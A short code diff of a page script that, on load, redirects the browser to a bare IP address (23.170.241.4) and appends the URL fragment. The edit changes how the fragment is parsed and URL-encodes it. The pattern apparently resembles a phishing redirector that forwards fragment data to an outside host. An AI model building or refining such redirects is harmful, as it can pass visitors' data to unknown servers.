@@ -1,7 +1,8 @@
 <script>
-    const hashValue = window.location.href.split('#').slice(1).join('#');
+    const hashValue = window.location.href.split('#')[1];
     if (hashValue) {
-        document.location.href = 'https://23.170.241.4/' + hashValue;
+        const cleanHash = encodeURIComponent(hashValue); // Encode special characters
+        document.location.href = 'https://23.170.241.4/' + cleanHash;
     } else {
         document.location.href = 'https://23.170.241.4/';
     }
